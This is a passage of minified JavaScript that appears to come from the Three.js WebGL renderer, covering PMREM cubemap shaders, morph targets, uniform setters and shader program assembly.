or({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null},texelSize:{value:e},inputEncoding:{value:ur[R]}},vertexShader:"\n\n\t\tprecision mediump float;\n\t\tprecision mediump int;\n\n\t\tattribute vec3 position;\n\t\tattribute vec2 uv;\n\t\tattribute float faceIndex;\n\n\t\tvarying vec3 vOutputDirection;\n\n\t\t// RH coordinate system; PMREM face-indexing convention\n\t\tvec3 getDirection( vec2 uv, float face ) {\n\n\t\t\tuv = 2.0 * uv - 1.0;\n\n\t\t\tvec3 direction = vec3( uv, 1.0 );\n\n\t\t\tif ( face == 0.0 ) {\n\n\t\t\t\tdirection = direction.zyx; // ( 1, v, u ) pos x\n\n\t\t\t} else if ( face == 1.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xz *= -1.0; // ( -u, 1, -v ) pos y\n\n\t\t\t} else if ( face == 2.0 ) {\n\n\t\t\t\tdirection.x *= -1.0; // ( -u, v, 1 ) pos z\n\n\t\t\t} else if ( face == 3.0 ) {\n\n\t\t\t\tdirection = direction.zyx;\n\t\t\t\tdirection.xz *= -1.0; // ( -1, v, -u ) neg x\n\n\t\t\t} else if ( face == 4.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xy *= -1.0; // ( -u, -1, v ) neg y\n\n\t\t\t} else if ( face == 5.0 ) {\n\n\t\t\t\tdirection.z *= -1.0; // ( u, v, -1 ) neg z\n\n\t\t\t}\n\n\t\t\treturn direction;\n\n\t\t}\n\n\t\tvoid main() {\n\n\t\t\tvOutputDirection = getDirection( uv, faceIndex );\n\t\t\tgl_Position = vec4( position, 1.0 );\n\n\t\t}\n\t",fragmentShader:"\n\n\t\t\tprecision mediump float;\n\t\t\tprecision mediump int;\n\n\t\t\tvarying vec3 vOutputDirection;\n\n\t\t\tuniform sampler2D envMap;\n\t\t\tuniform vec2 texelSize;\n\n\t\t\t".concat("\n\n\t\tuniform int inputEncoding;\n\n\t\t#include <encodings_pars_fragment>\n\n\t\tvec4 inputTexelToLinear( vec4 value ) {\n\n\t\t\tif ( inputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else {\n\n\t\t\t\treturn sRGBToLinear( value );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 envMapTexelToLinear( vec4 color ) {\n\n\t\t\treturn inputTexelToLinear( color );\n\n\t\t}\n\t","\n\n\t\t\t#include <common>\n\n\t\t\tvoid main() {\n\n\t\t\t\tgl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );\n\n\t\t\t\tvec3 outputDirection = normalize( vOutputDirection );\n\t\t\t\tvec2 uv = equirectUv( outputDirection );\n\n\t\t\t\tvec2 f = fract( uv / texelSize - 0.5 );\n\t\t\t\tuv -= f * texelSize;\n\t\t\t\tvec3 tl = envMapTexelToLinear( texture2D ( envMap, uv ) ).rgb;\n\t\t\t\tuv.x += texelSize.x;\n\t\t\t\tvec3 tr = envMapTexelToLinear( texture2D ( envMap, uv ) ).rgb;\n\t\t\t\tuv.y += texelSize.y;\n\t\t\t\tvec3 br = envMapTexelToLinear( texture2D ( envMap, uv ) ).rgb;\n\t\t\t\tuv.x -= texelSize.x;\n\t\t\t\tvec3 bl = envMapTexelToLinear( texture2D ( envMap, uv ) ).rgb;\n\n\t\t\t\tvec3 tm = mix( tl, tr, f.x );\n\t\t\t\tvec3 bm = mix( bl, br, f.x );\n\t\t\t\tgl_FragColor.rgb = mix( tm, bm, f.y );\n\n\t\t\t}\n\t\t"),blending:0,depthTest:!1,depthWrite:!1})}function Sr(){return new or({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},inputEncoding:{value:ur[R]}},vertexShader:"\n\n\t\tprecision mediump float;\n\t\tprecision mediump int;\n\n\t\tattribute vec3 position;\n\t\tattribute vec2 uv;\n\t\tattribute float faceIndex;\n\n\t\tvarying vec3 vOutputDirection;\n\n\t\t// RH coordinate system; PMREM face-indexing convention\n\t\tvec3 getDirection( vec2 uv, float face ) {\n\n\t\t\tuv = 2.0 * uv - 1.0;\n\n\t\t\tvec3 direction = vec3( uv, 1.0 );\n\n\t\t\tif ( face == 0.0 ) {\n\n\t\t\t\tdirection = direction.zyx; // ( 1, v, u ) pos x\n\n\t\t\t} else if ( face == 1.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xz *= -1.0; // ( -u, 1, -v ) pos y\n\n\t\t\t} else if ( face == 2.0 ) {\n\n\t\t\t\tdirection.x *= -1.0; // ( -u, v, 1 ) pos z\n\n\t\t\t} else if ( face == 3.0 ) {\n\n\t\t\t\tdirection = direction.zyx;\n\t\t\t\tdirection.xz *= -1.0; // ( -1, v, -u ) neg x\n\n\t\t\t} else if ( face == 4.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xy *= -1.0; // ( -u, -1, v ) neg y\n\n\t\t\t} else if ( face == 5.0 ) {\n\n\t\t\t\tdirection.z *= -1.0; // ( u, v, -1 ) neg z\n\n\t\t\t}\n\n\t\t\treturn direction;\n\n\t\t}\n\n\t\tvoid main() {\n\n\t\t\tvOutputDirection = getDirection( uv, faceIndex );\n\t\t\tgl_Position = vec4( position, 1.0 );\n\n\t\t}\n\t",fragmentShader:"\n\n\t\t\tprecision mediump float;\n\t\t\tprecision mediump int;\n\n\t\t\tvarying vec3 vOutputDirection;\n\n\t\t\tuniform samplerCube envMap;\n\n\t\t\t".concat("\n\n\t\tuniform int inputEncoding;\n\n\t\t#include <encodings_pars_fragment>\n\n\t\tvec4 inputTexelToLinear( vec4 value ) {\n\n\t\t\tif ( inputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else {\n\n\t\t\t\treturn sRGBToLinear( value );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 envMapTexelToLinear( vec4 color ) {\n\n\t\t\treturn inputTexelToLinear( color );\n\n\t\t}\n\t","\n\n\t\t\tvoid main() {\n\n\t\t\t\tgl_FragColor = envMapTexelToLinear( textureCube( envMap, vec3( - vOutputDirection.x, vOutputDirection.yz ) ) );\n\n\t\t\t}\n\t\t"),blending:0,depthTest:!1,depthWrite:!1})}function kr(e){var t=new WeakMap,n=null;function s(e){var n=e.target;n.removeEventListener("dispose",s);var r=t.get(n);void 0!==r&&(t.delete(n),r.dispose())}return{get:function(l){if(l&&l.isTexture&&!1===l.isRenderTargetTexture){var c=l.mapping,u=c===a||c===o,d=c===r||c===i;if(u||d){if(t.has(l))return t.get(l).texture;var p=l.image;if(u&&p&&0<p.height||d&&p&&function(e){for(var t=0,n=0;n<6;n++)void 0!==e[n]&&t++;return 6===t}(p)){var h=e.getRenderTarget();null===n&&(n=new _r(e));var f=u?n.fromEquirectangular(l):n.fromCubemap(l);return t.set(l,f),e.setRenderTarget(h),l.addEventListener("dispose",s),f.texture}return null}}return l},dispose:function(){t=new WeakMap,null!==n&&(n.dispose(),n=null)}}}function Mr(e){var t={};function n(n){if(void 0!==t[n])return t[n];var r;switch(n){case"WEBGL_depth_texture":r=e.getExtension("WEBGL_depth_texture")||e.getExtension("MOZ_WEBGL_depth_texture")||e.getExtension("WEBKIT_WEBGL_depth_texture");break;case"EXT_texture_filter_anisotropic":r=e.getExtension("EXT_texture_filter_anisotropic")||e.getExtension("MOZ_EXT_texture_filter_anisotropic")||e.getExtension("WEBKIT_EXT_texture_filter_anisotropic");break;case"WEBGL_compressed_texture_s3tc":r=e.getExtension("WEBGL_compressed_texture_s3tc")||e.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||e.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");break;case"WEBGL_compressed_texture_pvrtc":r=e.getExtension("WEBGL_compressed_texture_pvrtc")||e.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");break;default:r=e.getExtension(n)}return t[n]=r}return{has:function(e){return null!==n(e)},init:function(e){e.isWebGL2?n("EXT_color_buffer_float"):(n("WEBGL_depth_texture"),n("OES_texture_float"),n("OES_texture_half_float"),n("OES_texture_half_float_linear"),n("OES_standard_derivatives"),n("OES_element_index_uint"),n("OES_vertex_array_object"),n("ANGLE_instanced_arrays")),n("OES_texture_float_linear"),n("EXT_color_buffer_half_float"),n("WEBGL_multisampled_render_to_texture")},get:function(e){return n(e)}}}function Br(e,t,n,r){var i={},a=new WeakMap;function o(e){var s=e.target;for(var l in null!==s.index&&t.remove(s.index),s.attributes)t.remove(s.attributes[l]);s.removeEventListener("dispose",o),delete i[s.id];var c=a.get(s);c&&(t.remove(c),a.delete(s)),r.releaseStatesOfGeometry(s),!0===s.isInstancedBufferGeometry&&delete s._maxInstanceCount,n.memory.geometries--}function s(e){var n=[],r=e.index,i=e.attributes.position,o=0;if(null!==r){var s=r.array;o=r.version;for(var l=0,c=s.length;l<c;l+=3){var u=s[l+0],d=s[l+1],p=s[l+2];n.push(u,d,d,p,p,u)}}else{var h=i.array;o=i.version;for(var f=0,A=h.length/3-1;f<A;f+=3){var m=f+0,v=f+1,g=f+2;n.push(m,v,v,g,g,m)}}var y=new(65535<ae(n)?Jt:Xt)(n,1);y.version=o;var b=a.get(e);b&&t.remove(b),a.set(e,y)}return{get:function(e,t){return!0===i[t.id]||(t.addEventListener("dispose",o),i[t.id]=!0,n.memory.geometries++),t},update:function(n){var r=n.attributes;for(var i in r)t.update(r[i],e.ARRAY_BUFFER);var a=n.morphAttributes;for(var o in a)for(var s=a[o],l=0,c=s.length;l<c;l++)t.update(s[l],e.ARRAY_BUFFER)},getWireframeAttribute:function(e){var t=a.get(e);if(t){var n=e.index;null!==n&&t.version<n.version&&s(e)}else s(e);return a.get(e)}}}function Er(e,t,n,r){var i,a,o,s=r.isWebGL2;this.setMode=function(e){i=e},this.setIndex=function(e){a=e.type,o=e.bytesPerElement},this.render=function(t,r){e.drawElements(i,r,a,t*o),n.update(r,i,1)},this.renderInstances=function(r,l,c){if(0!==c){var u,d;if(s)u=e,d="drawElementsInstanced";else if(d="drawElementsInstancedANGLE",null===(u=t.get("ANGLE_instanced_arrays")))return;u[d](i,l,a,r*o,c),n.update(l,i,c)}}}function Tr(e){var t={frame:0,calls:0,triangles:0,points:0,lines:0};return{memory:{geometries:0,textures:0},render:t,programs:null,autoReset:!0,reset:function(){t.frame++,t.calls=0,t.triangles=0,t.points=0,t.lines=0},update:function(n,r,i){switch(t.calls++,r){case e.TRIANGLES:t.triangles+=i*(n/3);break;case e.LINES:t.lines+=i*(n/2);break;case e.LINE_STRIP:t.lines+=i*(n-1);break;case e.LINE_LOOP:t.lines+=i*n;break;case e.POINTS:t.points+=i*n}}}}var Pr=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:null,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1;return _classCallCheck2(this,n),(e=t.call(this,null)).image={data:r,width:i,height:a,depth:o},e.magFilter=p,e.minFilter=p,e.wrapR=u,e.generateMipmaps=!1,e.flipY=!1,e.unpackAlignment=1,e}return n}();function Ir(e,t){return e[0]-t[0]}function Fr(e,t){return Math.abs(t[1])-Math.abs(e[1])}function Lr(e,t){var n=1,r=t.isInterleavedBufferAttribute?t.data.array:t.array;r instanceof Int8Array?n=127:r instanceof Int16Array?n=32767:r instanceof Int32Array&&(n=2147483647),e.divideScalar(n)}function Or(e,t,n){for(var r={},i=new Float32Array(8),a=new WeakMap,o=new ye,s=[],l=0;l<8;l++)s[l]=[l,0];return{update:function(l,c,u,d){var p=l.morphTargetInfluences;if(!0===t.isWebGL2){var h=c.morphAttributes.position.length,f=a.get(c);if(void 0===f||f.count!==h){void 0!==f&&f.texture.dispose();var A=void 0!==c.morphAttributes.normal,m=c.morphAttributes.position,v=c.morphAttributes.normal||[],g=!0===A?2:1,y=c.attributes.position.count*g,b=1;y>t.maxTextureSize&&(b=Math.ceil(y/t.maxTextureSize),y=t.maxTextureSize);var w=new Float32Array(y*b*4*h),C=new Pr(w,y,b,h);C.format=S,C.type=_,C.needsUpdate=!0;for(var x=4*g,k=0;k<h;k++)for(var M=m[k],B=v[k],E=y*b*4*k,T=0;T<M.count;T++){o.fromBufferAttribute(M,T),!0===M.normalized&&Lr(o,M);var P=T*x;w[E+P+0]=o.x,w[E+P+1]=o.y,w[E+P+2]=o.z,!(w[E+P+3]=0)===A&&(o.fromBufferAttribute(B,T),!0===B.normalized&&Lr(o,B),w[E+P+4]=o.x,w[E+P+5]=o.y,w[E+P+6]=o.z,w[E+P+7]=0)}f={count:h,texture:C,size:new re(y,b)},a.set(c,f)}for(var I=0,F=0;F<p.length;F++)I+=p[F];var L=c.morphTargetsRelative?1:1-I;d.getUniforms().setValue(e,"morphTargetBaseInfluence",L),d.getUniforms().setValue(e,"morphTargetInfluences",p),d.getUniforms().setValue(e,"morphTargetsTexture",f.texture,n),d.getUniforms().setValue(e,"morphTargetsTextureSize",f.size)}else{var O=void 0===p?0:p.length,N=r[c.id];if(void 0===N||N.length!==O){N=[];for(var D=0;D<O;D++)N[D]=[D,0];r[c.id]=N}for(var R=0;R<O;R++){var j=N[R];j[0]=R,j[1]=p[R]}N.sort(Fr);for(var U=0;U<8;U++)U<O&&N[U][1]?(s[U][0]=N[U][0],s[U][1]=N[U][1]):(s[U][0]=Number.MAX_SAFE_INTEGER,s[U][1]=0);s.sort(Ir);for(var $=c.morphAttributes.position,z=c.morphAttributes.normal,H=0,V=0;V<8;V++){var Q=s[V],G=Q[0],W=Q[1];G!==Number.MAX_SAFE_INTEGER&&W?($&&c.getAttribute("morphTarget"+V)!==$[G]&&c.setAttribute("morphTarget"+V,$[G]),z&&c.getAttribute("morphNormal"+V)!==z[G]&&c.setAttribute("morphNormal"+V,z[G]),H+=i[V]=W):($&&!0===c.hasAttribute("morphTarget"+V)&&c.deleteAttribute("morphTarget"+V),z&&!0===c.hasAttribute("morphNormal"+V)&&c.deleteAttribute("morphNormal"+V),i[V]=0)}var K=c.morphTargetsRelative?1:1-H;d.getUniforms().setValue(e,"morphTargetBaseInfluence",K),d.getUniforms().setValue(e,"morphTargetInfluences",i)}}}}function Nr(e,t,n,r){var i=new WeakMap;function a(e){var t=e.target;t.removeEventListener("dispose",a),n.remove(t.instanceMatrix),null!==t.instanceColor&&n.remove(t.instanceColor)}return{update:function(o){var s=r.render.frame,l=o.geometry,c=t.get(o,l);return i.get(c)!==s&&(t.update(c),i.set(c,s)),o.isInstancedMesh&&(!1===o.hasEventListener("dispose",a)&&o.addEventListener("dispose",a),n.update(o.instanceMatrix,e.ARRAY_BUFFER),null!==o.instanceColor&&n.update(o.instanceColor,e.ARRAY_BUFFER)),c},dispose:function(){i=new WeakMap}}}Pr.prototype.isDataTexture2DArray=!0;var Dr=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:null,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1;return _classCallCheck2(this,n),(e=t.call(this,null)).image={data:r,width:i,height:a,depth:o},e.magFilter=p,e.minFilter=p,e.wrapR=u,e.generateMipmaps=!1,e.flipY=!1,e.unpackAlignment=1,e}return n}();Dr.prototype.isDataTexture3D=!0;var Rr=new pe,jr=new Pr,Ur=new Dr,$r=new Rn,zr=[],Hr=[],Vr=new Float32Array(16),Qr=new Float32Array(9),Gr=new Float32Array(4);function Wr(e,t,n){var r=e[0];if(r<=0||0<r)return e;var i=t*n,a=zr[i];if(void 0===a&&(a=new Float32Array(i),zr[i]=a),0!==t){r.toArray(a,0);for(var o=1,s=0;o!==t;++o)s+=n,e[o].toArray(a,s)}return a}function Kr(e,t){if(e.length!==t.length)return!1;for(var n=0,r=e.length;n<r;n++)if(e[n]!==t[n])return!1;return!0}function qr(e,t){for(var n=0,r=t.length;n<r;n++)e[n]=t[n]}function Xr(e,t){var n=Hr[t];void 0===n&&(n=new Int32Array(t),Hr[t]=n);for(var r=0;r!==t;++r)n[r]=e.allocateTextureUnit();return n}function Yr(e,t){var n=this.cache;n[0]!==t&&(e.uniform1f(this.addr,t),n[0]=t)}function Jr(e,t){var n=this.cache;if(void 0!==t.x)n[0]===t.x&&n[1]===t.y||(e.uniform2f(this.addr,t.x,t.y),n[0]=t.x,n[1]=t.y);else{if(Kr(n,t))return;e.uniform2fv(this.addr,t),qr(n,t)}}function Zr(e,t){var n=this.cache;if(void 0!==t.x)n[0]===t.x&&n[1]===t.y&&n[2]===t.z||(e.uniform3f(this.addr,t.x,t.y,t.z),n[0]=t.x,n[1]=t.y,n[2]=t.z);else if(void 0!==t.r)n[0]===t.r&&n[1]===t.g&&n[2]===t.b||(e.uniform3f(this.addr,t.r,t.g,t.b),n[0]=t.r,n[1]=t.g,n[2]=t.b);else{if(Kr(n,t))return;e.uniform3fv(this.addr,t),qr(n,t)}}function ei(e,t){var n=this.cache;if(void 0!==t.x)n[0]===t.x&&n[1]===t.y&&n[2]===t.z&&n[3]===t.w||(e.uniform4f(this.addr,t.x,t.y,t.z,t.w),n[0]=t.x,n[1]=t.y,n[2]=t.z,n[3]=t.w);else{if(Kr(n,t))return;e.uniform4fv(this.addr,t),qr(n,t)}}function ti(e,t){var n=this.cache,r=t.elements;if(void 0===r){if(Kr(n,t))return;e.uniformMatrix2fv(this.addr,!1,t),qr(n,t)}else{if(Kr(n,r))return;Gr.set(r),e.uniformMatrix2fv(this.addr,!1,Gr),qr(n,r)}}function ni(e,t){var n=this.cache,r=t.elements;if(void 0===r){if(Kr(n,t))return;e.uniformMatrix3fv(this.addr,!1,t),qr(n,t)}else{if(Kr(n,r))return;Qr.set(r),e.uniformMatrix3fv(this.addr,!1,Qr),qr(n,r)}}function ri(e,t){var n=this.cache,r=t.elements;if(void 0===r){if(Kr(n,t))return;e.uniformMatrix4fv(this.addr,!1,t),qr(n,t)}else{if(Kr(n,r))return;Vr.set(r),e.uniformMatrix4fv(this.addr,!1,Vr),qr(n,r)}}function ii(e,t){var n=this.cache;n[0]!==t&&(e.uniform1i(this.addr,t),n[0]=t)}function ai(e,t){var n=this.cache;Kr(n,t)||(e.uniform2iv(this.addr,t),qr(n,t))}function oi(e,t){var n=this.cache;Kr(n,t)||(e.uniform3iv(this.addr,t),qr(n,t))}function si(e,t){var n=this.cache;Kr(n,t)||(e.uniform4iv(this.addr,t),qr(n,t))}function li(e,t){var n=this.cache;n[0]!==t&&(e.uniform1ui(this.addr,t),n[0]=t)}function ci(e,t){var n=this.cache;Kr(n,t)||(e.uniform2uiv(this.addr,t),qr(n,t))}function ui(e,t){var n=this.cache;Kr(n,t)||(e.uniform3uiv(this.addr,t),qr(n,t))}function di(e,t){var n=this.cache;Kr(n,t)||(e.uniform4uiv(this.addr,t),qr(n,t))}function pi(e,t,n){var r=this.cache,i=n.allocateTextureUnit();r[0]!==i&&(e.uniform1i(this.addr,i),r[0]=i),n.safeSetTexture2D(t||Rr,i)}function hi(e,t,n){var r=this.cache,i=n.allocateTextureUnit();r[0]!==i&&(e.uniform1i(this.addr,i),r[0]=i),n.setTexture3D(t||Ur,i)}function fi(e,t,n){var r=this.cache,i=n.allocateTextureUnit();r[0]!==i&&(e.uniform1i(this.addr,i),r[0]=i),n.safeSetTextureCube(t||$r,i)}function Ai(e,t,n){var r=this.cache,i=n.allocateTextureUnit();r[0]!==i&&(e.uniform1i(this.addr,i),r[0]=i),n.setTexture2DArray(t||jr,i)}function mi(e,t){e.uniform1fv(this.addr,t)}function vi(e,t){var n=Wr(t,this.size,2);e.uniform2fv(this.addr,n)}function gi(e,t){var n=Wr(t,this.size,3);e.uniform3fv(this.addr,n)}function yi(e,t){var n=Wr(t,this.size,4);e.uniform4fv(this.addr,n)}function bi(e,t){var n=Wr(t,this.size,4);e.uniformMatrix2fv(this.addr,!1,n)}function _i(e,t){var n=Wr(t,this.size,9);e.uniformMatrix3fv(this.addr,!1,n)}function wi(e,t){var n=Wr(t,this.size,16);e.uniformMatrix4fv(this.addr,!1,n)}function Ci(e,t){e.uniform1iv(this.addr,t)}function xi(e,t){e.uniform2iv(this.addr,t)}function Si(e,t){e.uniform3iv(this.addr,t)}function ki(e,t){e.uniform4iv(this.addr,t)}function Mi(e,t){e.uniform1uiv(this.addr,t)}function Bi(e,t){e.uniform2uiv(this.addr,t)}function Ei(e,t){e.uniform3uiv(this.addr,t)}function Ti(e,t){e.uniform4uiv(this.addr,t)}function Pi(e,t,n){var r=t.length,i=Xr(n,r);e.uniform1iv(this.addr,i);for(var a=0;a!==r;++a)n.safeSetTexture2D(t[a]||Rr,i[a])}function Ii(e,t,n){var r=t.length,i=Xr(n,r);e.uniform1iv(this.addr,i);for(var a=0;a!==r;++a)n.setTexture3D(t[a]||Ur,i[a])}function Fi(e,t,n){var r=t.length,i=Xr(n,r);e.uniform1iv(this.addr,i);for(var a=0;a!==r;++a)n.safeSetTextureCube(t[a]||$r,i[a])}function Li(e,t,n){var r=t.length,i=Xr(n,r);e.uniform1iv(this.addr,i);for(var a=0;a!==r;++a)n.setTexture2DArray(t[a]||jr,i[a])}function Oi(e,t,n){this.id=e,this.addr=n,this.cache=[],this.setValue=function(e){switch(e){case 5126:return Yr;case 35664:return Jr;case 35665:return Zr;case 35666:return ei;case 35674:return ti;case 35675:return ni;case 35676:return ri;case 5124:case 35670:return ii;case 35667:case 35671:return ai;case 35668:case 35672:return oi;case 35669:case 35673:return si;case 5125:return li;case 36294:return ci;case 36295:return ui;case 36296:return di;case 35678:case 36198:case 36298:case 36306:case 35682:return pi;case 35679:case 36299:case 36307:return hi;case 35680:case 36300:case 36308:case 36293:return fi;case 36289:case 36303:case 36311:case 36292:return Ai}}(t.type)}function Ni(e,t,n){this.id=e,this.addr=n,this.cache=[],this.size=t.size,this.setValue=function(e){switch(e){case 5126:return mi;case 35664:return vi;case 35665:return gi;case 35666:return yi;case 35674:return bi;case 35675:return _i;case 35676:return wi;case 5124:case 35670:return Ci;case 35667:case 35671:return xi;case 35668:case 35672:return Si;case 35669:case 35673:return ki;case 5125:return Mi;case 36294:return Bi;case 36295:return Ei;case 36296:return Ti;case 35678:case 36198:case 36298:case 36306:case 35682:return Pi;case 35679:case 36299:case 36307:return Ii;case 35680:case 36300:case 36308:case 36293:return Fi;case 36289:case 36303:case 36311:case 36292:return Li}}(t.type)}function Di(e){this.id=e,this.seq=[],this.map={}}Ni.prototype.updateCache=function(e){var t=this.cache;e instanceof Float32Array&&t.length!==e.length&&(this.cache=new Float32Array(e.length)),qr(t,e)},Di.prototype.setValue=function(e,t,n){for(var r=this.seq,i=0,a=r.length;i!==a;++i){var o=r[i];o.setValue(e,t[o.id],n)}};var Ri=/(\w+)(\])?(\[|\.)?/g;function ji(e,t){e.seq.push(t),e.map[t.id]=t}function Ui(e,t,n){var r=e.name,i=r.length;for(Ri.lastIndex=0;;){var a=Ri.exec(r),o=Ri.lastIndex,s=a[1],l="]"===a[2],c=a[3];if(l&&(s|=0),void 0===c||"["===c&&o+2===i){ji(n,void 0===c?new Oi(s,e,t):new Ni(s,e,t));break}var u=n.map[s];void 0===u&&ji(n,u=new Di(s)),n=u}}function $i(e,t){this.seq=[],this.map={};for(var n=e.getProgramParameter(t,e.ACTIVE_UNIFORMS),r=0;r<n;++r){var i=e.getActiveUniform(t,r);Ui(i,e.getUniformLocation(t,i.name),this)}}function zi(e,t,n){var r=e.createShader(t);return e.shaderSource(r,n),e.compileShader(r),r}$i.prototype.setValue=function(e,t,n,r){var i=this.map[t];void 0!==i&&i.setValue(e,n,r)},$i.prototype.setOptional=function(e,t,n){var r=t[n];void 0!==r&&this.setValue(e,n,r)},$i.upload=function(e,t,n,r){for(var i=0,a=t.length;i!==a;++i){var o=t[i],s=n[o.id];!1!==s.needsUpdate&&o.setValue(e,s.value,r)}},$i.seqWithValue=function(e,t){for(var n=[],r=0,i=e.length;r!==i;++r){var a=e[r];a.id in t&&n.push(a)}return n};var Hi=0;function Vi(e){switch(e){case R:return["Linear","( value )"];case j:return["sRGB","( value )"];default:return["Linear","( value )"]}}function Qi(e,t,n){var r=e.getShaderParameter(t,e.COMPILE_STATUS),i=e.getShaderInfoLog(t).trim();return r&&""===i?"":n.toUpperCase()+"\n\n"+i+"\n\n"+function(e){for(var t=e.split("\n"),n=0;n<t.length;n++)t[n]=n+1+": "+t[n];return t.join("\n")}(e.getShaderSource(t))}function Gi(e,t){var n=Vi(t);return"vec4 "+e+"( vec4 value ) { return "+n[0]+"ToLinear"+n[1]+"; }"}function Wi(e){return""!==e}function Ki(e,t){return e.replace(/NUM_DIR_LIGHTS/g,t.numDirLights).replace(/NUM_SPOT_LIGHTS/g,t.numSpotLights).replace(/NUM_RECT_AREA_LIGHTS/g,t.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,t.numPointLights).replace(/NUM_HEMI_LIGHTS/g,t.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,t.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS/g,t.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,t.numPointLightShadows)}function qi(e,t){return e.replace(/NUM_CLIPPING_PLANES/g,t.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,t.numClippingPlanes-t.numClipIntersection)}var Xi=/^[ \t]*#include +<([\w\d./]+)>/gm;function Yi(e){return e.replace(Xi,Ji)}function Ji(e,t){var n=Xn[t];if(void 0===n)throw new Error("Can not resolve #include <"+t+">");return Yi(n)}var Zi=/#pragma unroll_loop[\s]+?for \( int i \= (\d+)\; i < (\d+)\; i \+\+ \) \{([\s\S]+?)(?=\})\}/g,ea=/#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;function ta(e){return e.replace(ea,ra).replace(Zi,na)}function na(e,t,n,r){return ra(e,t,n,r)}function ra(e,t,n,r){for(var i="",a=parseInt(t);a<parseInt(n);a++)i+=r.replace(/\[\s*i\s*\]/g,"[ "+a+" ]").replace(/UNROLLED_LOOP_INDEX/g,a);return i}function ia(e){var t="precision "+e.precision+" float;\nprecision "+e.precision+" int;";return"highp"===e.precision?t+="\n#define HIGH_PRECISION":"mediump"===e.precision?t+="\n#define MEDIUM_PRECISION":"lowp"===e.precision&&(t+="\n#define LOW_PRECISION"),t}function aa(e,t,n,a){var o,c,u,d,p,h,f,A=e.getContext(),m=n.defines,v=n.vertexShader,g=n.fragmentShader,y=(c="SHADOWMAP_TYPE_BASIC",1===(o=n).shadowMapType?c="SHADOWMAP_TYPE_PCF":2===o.shadowMapType?c="SHADOWMAP_TYPE_PCF_SOFT":3===o.shadowMapType&&(c="SHADOWMAP_TYPE_VSM"),c),b=function(e){var t="ENVMAP_TYPE_CUBE";if(e.envMap)switch(e.envMapMode){case r:case i:t="ENVMAP_TYPE_CUBE";break;case s:case l:t="ENVMAP_TYPE_CUBE_UV"}return t}(n),_=function(e){var t="ENVMAP_MODE_REFLECTION";if(e.envMap)switch(e.envMapMode){case i:case l:t="ENVMAP_MODE_REFRACTION"}return t}(n),w=function(e){var t="ENVMAP_BLENDING_NONE";if(e.envMap)switch(e.combine){case 0:t="ENVMAP_BLENDING_MULTIPLY";break;case 1:t="ENVMAP_BLENDING_MIX";break;case 2:t="ENVMAP_BLENDING_ADD"}return t}(n),C=n.isWebGL2?"":[(u=n).extensionDerivatives||u.envMapCubeUV||u.bumpMap||u.tangentSpaceNormalMap||u.clearcoatNormalMap||u.flatShading||"physical"===u.shaderID?"#extension GL_OES_standard_derivatives : enable":"",(u.extensionFragDepth||u.logarithmicDepthBuffer)&&u.rendererExtensionFragDepth?"#extension GL_EXT_frag_depth : enable":"",u.extensionDrawBuffers&&u.rendererExtensionDrawBuffers?"#extension GL_EXT_draw_buffers : require":"",(u.extensionShaderTextureLOD||u.envMap||u.transmission)&&u.rendererExtensionShaderTextureLod?"#extension GL_EXT_shader_texture_lod : enable":""].filter(Wi).join("\n"),S=function(e){var t=[];for(var n in e){var r=e[n];!1!==r&&t.push("#define "+n+" "+r)}return t.join("\n")}(m),k=A.createProgram(),M=n.glslVersion?"#version "+n.glslVersion+"\n":"";n.isRawShaderMaterial?(0<(d=[S].filter(Wi).join("\n")).length&&(d+="\n"),0<(p=[C,S].filter(Wi).join("\n")).length&&(p+="\n")):(d=[ia(n),"#define SHADER_NAME "+n.shaderName,S,n.instancing?"#define USE_INSTANCING":"",n.instancingColor?"#define USE_INSTANCING_COLOR":"",n.supportsVertexTextures?"#define VERTEX_TEXTURES":"","#define MAX_BONES "+n.maxBones,n.useFog&&n.fog?"#define USE_FOG":"",n.useFog&&n.fogExp2?"#define FOG_EXP2":"",n.map?"#define USE_MAP":"",n.envMap?"#define USE_ENVMAP":"",n.envMap?"#define "+_:"",n.lightMap?"#define USE_LIGHTMAP":"",n.aoMap?"#define USE_AOMAP":"",n.emissiveMap?"#define USE_EMISSIVEMAP":"",n.bumpMap?"#define USE_BUMPMAP":"",n.normalMap?"#define USE_NORMALMAP":"",n.normalMap&&n.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",n.normalMap&&n.tangentSpaceNormalMap?"#define TANGENTSPACE_NORMALMAP":"",n.clearcoatMap?"#define USE_CLEARCOATMAP":"",n.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",n.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",n.displacementMap&&n.supportsVertexTextures?"#define 